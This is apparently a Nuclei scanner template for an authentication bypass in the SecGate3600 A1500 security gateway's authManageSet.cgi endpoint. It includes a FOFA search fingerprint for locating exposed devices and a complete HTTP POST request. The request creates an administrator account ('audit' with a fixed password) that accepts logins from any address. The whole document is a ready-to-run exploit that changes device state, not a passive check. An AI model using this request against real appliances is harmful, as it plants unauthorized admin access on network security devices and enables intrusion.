id: nsfocus-secgate3600-auth-bypass

info:
  name: "网神 SecGate3600 authManageSet.cgi 会话绕过漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="sec_gate_image/button_normal.gif"
          网神SecGate3600 A1500设备的会话身份验证机制存在缺陷，攻击者可利用该漏洞绕过身份验证流程，未经授权访问管理员权限。
  tags: 网神SecGate3600

http:
- raw:
  - |
    POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
    Host: {{Hostname}}
    Accept: application/xml, text/xml, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Connection: close
     
    type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'version'
